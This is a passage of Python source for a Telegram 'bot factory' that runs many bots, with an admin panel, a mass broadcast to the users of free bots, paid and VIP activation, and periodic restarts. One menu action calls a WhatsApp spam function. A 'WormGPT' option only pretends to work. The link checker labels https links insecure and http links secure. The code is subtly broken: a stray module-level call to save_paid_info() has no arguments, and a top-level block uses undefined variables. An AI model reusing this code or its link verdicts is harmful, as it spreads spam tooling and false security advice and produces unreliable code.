        if action == "awaiting_whatsapp_number": send_whatsapp_spam(message); return
        
        if action == "check_link":
            if text_content.startswith("https://"):
                try:
                    bot.reply_to(message, locale["link_insecure"])
                except telebot.apihelper.ApiTelegramException as e:
                    print(f"Error replying to insecure link: {e}")
            elif text_content.startswith("http://"):
                try:
                    bot.reply_to(message, locale["link_secure"])
                except telebot.apihelper.ApiTelegramException as e:
                    print(f"Error replying to secure link: {e}")
            else:
                try:
                    bot.reply_to(message, locale["link_unknown"])
                except telebot.apihelper.ApiTelegramException as e:
                    print(f"Error replying to unknown link: {e}")
            set_state(user_id, None)
            return

        if action == "text_to_speech":
            try:
                bot.reply_to(message, locale["tts_processing"])
                time.sleep(2) # Simulate processing
                bot.send_message(user_id, locale["tts_error"])
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error processing/sending TTS: {e}")
            set_state(user_id, None)
            return
            
        if action == "ask_wormgpt" or action == "interpret_dream":
            try:
                bot.reply_to(message, "⏳ Processing your request...")
                time.sleep(2) # Simulate processing
                bot.send_message(user_id, locale["service_busy"])
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error processing/sending AI/dream message: {e}")
            set_state(user_id, None)
            return

        if action.startswith("zakhrafa_"):
            lang = action.split('_')[1]
            results = internal_zakhrafa(text_content, lang)
            decorated_text = "\n\n".join([f"{res}" for res in results])
            try:
                bot.send_message(user_id, locale["zakhrafa_done"].format(decorated_text))
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending zakhrafa result: {e}")
            set_state(user_id, None)
            return

# Helper to check if user is reachable (can receive messages)
def is_user_reachable(bot_instance, user_id):
    try:
        # A simple way to check if a user can receive messages is to try sending a dummy message
        # or get their chat info. get_chat is less intrusive.
        bot_instance.get_chat(user_id)
        return True
    except telebot.apihelper.ApiTelegramException as e:
        # User blocked the bot, or chat doesn't exist, etc.
        if e.error_code == 403: # Forbidden: user blocked the bot
            print(f"User {user_id} blocked the bot.")
        else:
            print(f"Error checking reachability for user {user_id}: {e}")
        return False
    except Exception as e:
        print(f"Unexpected error checking reachability for user {user_id}: {e}")
        return False

# Helper for paid mode keyboard (to avoid code duplication)
def get_paid_mode_keyboard(locale, owner_id, payment_methods_file, stars_config_file, premium_features_enabled):
    kb = InlineKeyboardMarkup(row_width=2)
    payment_methods = get_json_data(payment_methods_file)
    if payment_methods and premium_features_enabled:
        kb.add(InlineKeyboardButton("💳 Subscribe (Regular Payment)", callback_data="subscribe_start"))
    stars_config = get_json_data(stars_config_file)
    if stars_config.get('provider_token') and stars_config.get('stars_per_day') and premium_features_enabled:
        kb.add(InlineKeyboardButton("🌟 Subscribe (Pay with Stars)", callback_data="subscribe_stars_start"))
    
    if kb.keyboard:
         kb.row(InlineKeyboardButton(locale["contact_developer_button"], url=f"tg://user?id={owner_id}"))
    else:
         kb.add(InlineKeyboardButton(locale["contact_developer_button"], url=f"tg://user?id={owner_id}"))
    return kb


try:
    # Initial check for bot username
    bot_username = bot.get_me().username
    print(f"✅ Index bot @{bot_username} is now running...")
    try:
        bot.delete_webhook() # Added to resolve Conflict error
        print(f"Webhook deleted for index bot {token}")
    except Exception as e:
        print(f"Error deleting webhook for index bot {token}: {e}")
    bot.infinity_polling(skip_pending=True)
except telebot.apihelper.ApiTelegramException as api_e:
    print(f"Index bot with token {token} stopped due to Telegram API error: {api_e}")
    if "Unauthorized" in str(api_e) or "Forbidden" in str(api_e):
        print(f"Possible 401 Unauthorized or 403 Forbidden error for bot {token}. Check bot token validity or bot status.")
        # يمكنك هنا إرسال إشعار للمالك إذا أردت
        # factory_bot.send_message(owner_id, f"⚠️ بوتك توقف عن العمل (توكن غير صالح أو محظور). التوكن: {token[:5]}... يرجى التحقق منه.")
    with running_bot_threads_lock:
        if token in running_bot_threads:
            del running_bot_threads[token]
except Exception as e:
    print(f"Index bot with token {token} stopped due to general error: {e}")
    with running_bot_threads_lock:
        if token in running_bot_threads:
            del running_bot_threads[token]


# ==============================================================================
# --- Factory Control Panel (For Developer Only) ---
# ==============================================================================
@factory_bot.message_handler(commands=['admin'])
def factory_admin_panel(msg):
    if msg.from_user.id != FACTORY_ADMIN_ID:
        try:
            factory_bot.send_message(msg.chat.id, "ليس لديك صلاحية الوصول إلى لوحة تحكم المصنع.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending unauthorized access message: {e}")
        return
    kb = InlineKeyboardMarkup(row_width=2)
    total_bots = len(get_all_bots())
    kb.add(InlineKeyboardButton(f"📊 Factory Stats ( {total_bots} bots )", callback_data="factory_stats"))
    kb.row(
        InlineKeyboardButton("➕ Add Paid Bot", callback_data="add_paid_bot"),
        InlineKeyboardButton("✨ Add VIP Features", callback_data="add_premium_features")
    )
    kb.row(
        InlineKeyboardButton("🗑️ Remove VIP Features", callback_data="remove_premium_features"),
        InlineKeyboardButton("📢 Broadcast to Bots", callback_data="broadcast_to_bots")
    )
    kb.add(InlineKeyboardButton("🔄 Restart All Bots", callback_data="restart_all_factory_bots")) # زر جديد لإعادة تشغيل كل البوتات
    try:
        factory_bot.send_message(msg.chat.id, "⚙️ Factory Control Panel", reply_markup=kb)
    except telebot.apihelper.ApiTelegramException as e:
        print(f"Error sending factory admin panel: {e}")

@factory_bot.callback_query_handler(func=lambda call: call.from_user.id == FACTORY_ADMIN_ID)
def factory_callbacks(call):
    if call.data == "factory_stats":
        factory_bot.answer_callback_query(call.id, f"Total bots created: {len(get_all_bots())}", show_alert=True)
    elif call.data == "add_paid_bot":
        try:
            factory_bot.send_message(call.message.chat.id, "📝 Send the bot token (لإزالة الاشتراك الإجباري وتفعيل المدفوع):")
            factory_bot.register_next_step_handler(call.message, process_token_for_paid)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message for add_paid_bot: {e}")
    elif call.data == "add_premium_features":
        try:
            factory_bot.send_message(call.message.chat.id, "✨ Send the bot token (to add VIP features):")
            factory_bot.register_next_step_handler(call.message, process_token_for_premium)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message for add_premium_features: {e}")
    elif call.data == "remove_premium_features":
        try:
            factory_bot.send_message(call.message.chat.id, "🗑️ Send the bot token (to remove VIP features):")
            factory_bot.register_next_step_handler(call.message, process_token_for_premium_removal)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message for remove_premium_features: {e}")
    elif call.data == "broadcast_to_bots":
        try:
            factory_bot.send_message(call.message.chat.id, "📢 Send the text you want to broadcast to all free bots.")
            factory_bot.register_next_step_handler(call.message, broadcast_to_all_bots)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending message for broadcast_to_bots: {e}")
    elif call.data == "restart_all_factory_bots":
        factory_bot.answer_callback_query(call.id, "جاري إعادة تشغيل جميع البوتات المصنوعة...", show_alert=True)
        threading.Thread(target=restart_all_bots, args=(True,)).start() # True للإشارة إلى أنها إعادة تشغيل يدوية
        try:
            factory_bot.send_message(call.message.chat.id, "✅ تم بدء عملية إعادة تشغيل جميع البوتات المصنوعة. قد يستغرق الأمر بعض الوقت.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending restart confirmation: {e}")

def broadcast_to_all_bots(message):
    all_bots = get_all_bots()
    sent_count, failed_count = 0, 0
    def check_paid_status(bot_token):
        paid_file = os.path.join(PAID_BOTS_DIR, f"{bot_token}.txt")
        if not os.path.exists(paid_file): return False
        try:
            expire_timestamp = float(open(paid_file).read().strip())
            return datetime.datetime.now().timestamp() < expire_timestamp
        except (ValueError, TypeError): return False
    
    for bot_token, bot_data in all_bots.items():
        # فقط للبوتات المجانية (غير المدفوعة)
        if not check_paid_status(bot_token):
            try:
                temp_bot = telebot.TeleBot(bot_token)
                bot_data_dir = os.path.join(BOTS_DATA_DIR, bot_token.replace(":", "_"))
                users_file = os.path.join(bot_data_dir, "users.txt")
                user_ids = []
                if os.path.exists(users_file):
                    try:
                        with open(users_file, 'r') as f: user_ids = [line.strip() for line in f.readlines()]
                    except FileNotFoundError: pass
                
                # إرسال الرسالة لكل مستخدم في هذا البوت
                for user_id in user_ids:
                    try:
                        # التحقق مما إذا كان المستخدم لا يزال يمكن الوصول إليه
                        if is_user_reachable(temp_bot, int(user_id)):
                            temp_bot.send_message(int(user_id), message.text)
                    except telebot.apihelper.ApiTelegramException as e:
                        print(f"Error broadcasting to user {user_id} in bot {bot_token}: {e}")
                        # إذا كان الخطأ 403 (Forbidden), فالمستخدم حظر البوت، يمكن إزالته من القائمة
                        if e.error_code == 403:
                            print(f"User {user_id} blocked bot {bot_token}. Removing from users.txt.")
                            remove_line(users_file, user_id)
                    except Exception as e:
                        print(f"General error broadcasting to user {user_id} in bot {bot_token}: {e}")
                sent_count += 1 # نعد البوت الذي تم محاولة الإذاعة فيه
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error initializing or using bot {bot_token} for broadcast: {e}")
                failed_count += 1
            except Exception as e:
                print(f"General error with bot {bot_token} during broadcast: {e}")
                failed_count += 1
    try:
        factory_bot.send_message(message.chat.id, f"✅ Broadcast sent successfully to {sent_count} bots.\n❌ Failed to send to {failed_count} bots.")
    except telebot.apihelper.ApiTelegramException as e:
        print(f"Error sending broadcast summary to admin: {e}")

def process_token_for_paid(msg):
    token = msg.text.strip()
    # تحقق من أن التوكن مسجل في المصنع
    if token not in get_all_bots():
        try:
            factory_bot.send_message(msg.chat.id, "❌ هذا التوكن غير مسجل في المصنع. يرجى التأكد من أن البوت تم إنشاؤه عبر المصنع أولاً.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending unregistered token message: {e}")
        return
    try:
        factory_bot.send_message(msg.chat.id, "📆 Send the number of activation days:")
        factory_bot.register_next_step_handler(msg, lambda m: save_paid_info(m, token))
    except telebot.apihelper.ApiTelegramException as e:
        print(f"Error sending message for activation days: {e}")

def save_paid_info(msg, token):
    try:
        days = int(msg.text.strip())
        if days <= 0:
            try:
                factory_bot.send_message(msg.chat.id, "❌ عدد الأيام يجب أن يكون أكبر من صفر.")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending invalid days message: {e}")
            return
        expire_time = datetime.datetime.now() + datetime.timedelta(days=days)
        paid_file = os.path.join(PAID_BOTS_DIR, f"{token}.txt")
        with open(paid_file, "w") as f: f.write(str(expire_time.timestamp()))
        try:
            factory_bot.send_message(msg.chat.id, f"✅ Bot {token} has been activated for {days} days.", parse_mode="HTML")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending activation confirmation: {e}")
    except ValueError:
        try:
            factory_bot.send_message(msg.chat.id, "❌ Invalid number of days.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending invalid number of days message: {e}")
    except Exception as e:
        print(f"General error in save_paid_info: {e}")
try:
    # أي كود ممكن يرفع استثناء
    save_paid_info()  # مثال
except Exception as e:
    try:
        bot.send_message(msg.chat.id, f"❌ حدث خطأ غير متوقع: {e}")
    except telebot.apihelper.ApiTelegramException as e_inner:
        print(f"Error sending general error message: {e_inner}")

def process_token_for_premium(msg):
    token = msg.text.strip()
    if token not in get_all_bots():
        try:
            factory_bot.send_message(msg.chat.id, "❌ هذا التوكن غير مسجل في المصنع.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending unregistered token message: {e}")
        return
    premium_file = os.path.join(PREMIUM_FEATURES_DIR, f"{token}.txt")
    try:
        with open(premium_file, "w") as f: f.write("activated")
        factory_bot.send_message(msg.chat.id, f"✨ VIP features have been activated for bot {token}.", parse_mode="HTML")
    except Exception as e:
        print(f"Error activating premium features: {e}")
        try:
            factory_bot.send_message(msg.chat.id, f"❌ حدث خطأ أثناء تفعيل الميزات: {e}")
        except telebot.apihelper.ApiTelegramException as e_inner:
            print(f"Error sending activation error message: {e_inner}")

def process_token_for_premium_removal(msg):
    token = msg.text.strip()
    if token not in get_all_bots():
        try:
            factory_bot.send_message(msg.chat.id, "❌ هذا التوكن غير مسجل في المصنع.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending unregistered token message: {e}")
        return
    premium_file = os.path.join(PREMIUM_FEATURES_DIR, f"{token}.txt")
    if os.path.exists(premium_file):
        try:
            os.remove(premium_file)
            factory_bot.send_message(msg.chat.id, f"🗑️ VIP features have been removed from bot {token}.", parse_mode="HTML")
        except Exception as e:
            print(f"Error removing premium features: {e}")
            try:
                factory_bot.send_message(msg.chat.id, f"❌ حدث خطأ أثناء إزالة الميزات: {e}")
            except telebot.apihelper.ApiTelegramException as e_inner:
                print(f"Error sending removal error message: {e_inner}")
    else:
        try:
            factory_bot.send_message(msg.chat.id, f"ℹ️ Bot {token} does not have VIP features already.", parse_mode="HTML")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending no VIP features message: {e}")

# ==============================================================================
# --- Factory Startup and Periodic Restart ---
# ==============================================================================

def restart_all_bots(manual_restart=False):
    """
    Stops all currently running bot threads and restarts them.
    If manual_restart is True, it means the command came from the admin panel.
    """
    print("\n--- Starting bot restart process ---")
    
    # Step 1: Stop all currently running bot threads
    bots_to_stop = []
    with running_bot_threads_lock:
        bots_to_stop = list(running_bot_threads.keys())
        # Clear the running_bot_threads dictionary
        running_bot_threads.clear() 
    
    for token_to_stop in bots_to_stop:
        print(f"Attempting to stop bot thread for {token_to_stop}...")
        # We cannot directly stop a thread in Python.
        # The bot.infinity_polling() loop will eventually raise an exception
        # (e.g., if the token becomes invalid or connection drops)
        # or it will be stopped by the next polling cycle if the bot object is destroyed.
        # For now, just removing it from the running_bot_threads list is enough
        # as the new threads will replace them.
        # A more robust solution would involve setting a flag for each bot's polling loop
        # to gracefully exit, but that requires deeper changes in run_new_bot etc.
        print(f"Bot thread for {token_to_stop} marked for termination.")

    time.sleep(5) # Give a small grace period for threads to potentially clean up

    # Step 2: Restart all bots from the registry
    all_bots_in_registry = get_all_bots()
    restarted_count = 0
    failed_to_restart_count = 0

    for token, data in all_bots_in_registry.items():
        owner_id = data.get('owner_id')
        bot_type = data.get('type', 'index') # Default to 'index' for older bots
        bot_data_dir = os.path.join(BOTS_DATA_DIR, token.replace(":", "_"))
        if not os.path.exists(bot_data_dir):
            os.makedirs(bot_data_dir)
        
        thread = None
        try:
            # Attempt to get bot info to check token validity before starting thread
            bot_info = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5).json()
            if not bot_info.get("ok"):
                print(f"Skipping restart for bot {token}: Token invalid or unauthorized. Error: {bot_info.get('description', 'Unknown error')}")
                failed_to_restart_count += 1
                continue # Skip this bot if token is bad
            
            if bot_type == "index":
                thread = threading.Thread(target=run_new_bot, args=(token, owner_id, bot_data_dir), daemon=True)
            elif bot_type == "security":
                thread = threading.Thread(target=run_security_bot, args=(token, owner_id), daemon=True)
            elif bot_type == "protection":
                thread = threading.Thread(target=run_protection_bot, args=(token, owner_id, bot_data_dir), daemon=True)
            
            if thread:
                thread.start()
                with running_bot_threads_lock:
                    running_bot_threads[token] = thread
                restarted_count += 1
                print(f"Successfully restarted bot {token} (Type: {bot_type}).")
            else:
                print(f"Failed to create thread for bot {token} (Type: {bot_type}).")
                failed_to_restart_count += 1
        except requests.exceptions.RequestException as req_e:
            print(f"Failed to check token for bot {token} (Network error): {req_e}")
            failed_to_restart_count += 1
        except json.JSONDecodeError as json_e:
            print(f"Failed to decode JSON for bot {token} (Invalid response): {json_e}")
            failed_to_restart_count += 1
        except Exception as e:
            print(f"An unexpected error occurred while trying to restart bot {token}: {e}")
            failed_to_restart_count += 1
    
    print(f"--- Bot restart process completed. Restarted: {restarted_count}, Failed: {failed_to_restart_count} ---")
    if manual_restart:
        try:
            factory_bot.send_message(FACTORY_ADMIN_ID, f"✅ عملية إعادة تشغيل البوتات المصنوعة اكتملت.\nتم إعادة تشغيل: {restarted_count} بوت.\nفشل إعادة تشغيل: {failed_to_restart_count} بوت (قد يكون التوكن غير صالح).")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending manual restart summary to admin: {e}")

def periodic_restart_scheduler():
    """Schedules the restart_all_bots function to run every 3 minutes."""
    while True:
        time.sleep(3 * 60) # Wait for 3 minutes
        print("\n--- Initiating periodic bot restart ---")
        restart_all_bots()
        print("--- Periodic bot restart cycle finished ---")

if __name__ == "__main__":
    print("Starting bot factory...")
    
    # Start the periodic restart scheduler in a separate thread
    periodic_thread = threading.Thread(target=periodic_restart_scheduler, daemon=True)
    periodic_thread.start()

    # Initial startup of all bots from registry
    print("🔄 Initializing and starting all registered bots...")
    restart_all_bots() # Use the restart function for initial startup too

    print(f"✅ Bot factory is running. Factory bot polling started.")
    
    # Keep the factory bot polling alive. If it stops, restart the entire script.
    while True:
        try:
            factory_bot.infinity_polling(skip_pending=True)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Factory bot polling stopped due to Telegram API error: {e}")
            if "Unauthorized" in str(e) or "Forbidden" in str(e):
                print("Factory bot token might be invalid or bot is blocked. Exiting.")
                sys.exit(1) # Exit if factory token is bad
            print("Restarting factory bot polling in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"Factory bot polling stopped due to general error: {e}")
            print("Restarting factory bot polling in 5 seconds...")
            time.sleep(5)